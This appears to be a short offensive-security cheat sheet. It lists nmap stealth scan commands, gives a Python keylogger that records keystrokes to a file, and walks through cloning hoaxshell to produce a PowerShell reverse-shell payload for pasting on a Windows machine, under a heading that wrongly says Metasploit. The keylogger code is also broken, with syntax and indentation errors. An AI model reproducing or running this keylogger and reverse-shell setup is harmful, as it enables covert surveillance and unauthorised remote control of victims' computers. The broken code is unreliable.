#Port scanning using NMAP
nmap -sA ip
nmap -sS ip
nmap -sF ip
nmap -sN ip
nmap -sX ip

#keylogger
from pynput import keyboard
def keyPressed(key):
    print(str(key)
    with open("keyfile.txt",'a')as logKey:
       try:
          char=key.char
          logKey.write(char)
       except:
          print("Error getting char")
if__name__=="__main__":
  listener=keyboard.Listener(on_press=keyPressed)
  listener.start()
      input()

#Metasploit
git clone https://github.com/t3l3machus/hoaxshell.git
cd hoaxshell
pip3 install -r requirements.txt
ifconfig
copy inet addr of eth0
python3 hoaxshell.py -s <paste copied inet addr ip> -cm
copy payload and paste into windows powershell




